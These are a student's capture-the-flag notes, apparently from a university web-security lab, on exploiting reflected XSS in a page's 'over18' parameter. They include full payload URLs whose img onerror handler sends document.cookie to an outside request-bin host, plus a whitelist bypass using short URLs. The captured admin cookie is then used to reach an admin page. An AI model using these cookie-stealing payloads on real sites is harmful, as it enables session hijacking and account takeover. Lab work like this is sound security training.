http://websec.vusec.net:63911/93jUDxbw/dumpster.html?vid=3&over18=yes%22%3EEli%20%3Cimg%20src=x%20onerror=fetch(%27https://en7ro7ej230wc.x.pipedream.net%27,{method:%27POST%27,body:document.cookie})%3E

http://websec.vusec.net:63911/93jUDxbw/dumpster.html?vid=3&over18=yes%22%3EEli%20%3Cimg%20src=x%20onerror="this.src='https://en7ro7ej230wc.x.pipedream.net?'+document.cookie">

?pw=supersecureadminpw

- first thought this was an SSRF vuln, because the server will send a request to an URL through the bug report
    - whitelisted with `websec.vusec.net` but can be circumvented with short urls like `https://google.com#websec.vusec.net` -> using tiny.cc this can make the server make a request to requestbin, but not of much use
- then saw that in the source of the GIF dumpster, the `over18` argument is set in the HTML input tag using `.setInnerHTML`. Can let the server render this URL and then execute script -> reflected xss
    - though, `.setInnerHTML` will avoid executing script tags set through it as a prevention measure
        - but can add an image with a non-existent src and then use the `onerror` handler to execute a script: `<img src='x' onerror='alert("yo")'>
            - tried to make the onerror do a fetch to my requestbin with its cookies, but did not work, it does seem to load the image source though
            - then tried to update the image source on error so that the javascript `document.cookie` can be injected: `onerror='this.src=RQBIN.com/?' + document.cookie`
                - this worked, and the web server actually fetches the new source as well, nice
                - it fetched the new source (rqbin) with `?pw=supersecureadminpw`, nice and secure
                    - then use this as the cookie for making a request to /admin.php (which is done by cookiecheck on the first page load in an AJAX request)
                        
- final payload for the bug report form:
http://websec.vusec.net:63911/93jUDxbw/dumpster.html?vid=3&over18=yes%22%3EEli%20%3Cimg%20src=x%20onerror=%22this.src=%27https://en7ro7ej230wc.x.pipedream.net?%27%2Bdocument.cookie%22%3E
